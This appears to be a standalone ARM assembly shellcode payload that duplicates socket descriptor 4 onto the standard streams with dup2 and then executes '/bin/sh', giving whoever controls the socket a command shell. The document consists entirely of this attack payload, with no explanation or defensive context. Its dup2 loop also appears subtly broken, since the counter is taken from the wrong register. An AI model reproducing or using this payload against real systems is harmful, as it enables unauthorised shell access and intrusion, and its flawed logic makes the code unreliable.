.section .text
.global _start

.set SOCKFD, 4

_start:
    mov     r0, #SOCKFD
    mov     r1, #2
    sub     r2, r2, r2
    mov     r7, #63         // dup2

loop:
    svc     0
    subs    r1, r0, #1
    bge     loop

    mov     r0, pc
    b       execve
    .ascii "/bin/sh\x00"

execve:
    stm     sp, {r0, r2}
    mov     r1, sp
    mov     r7, #11         // execve
    svc     0
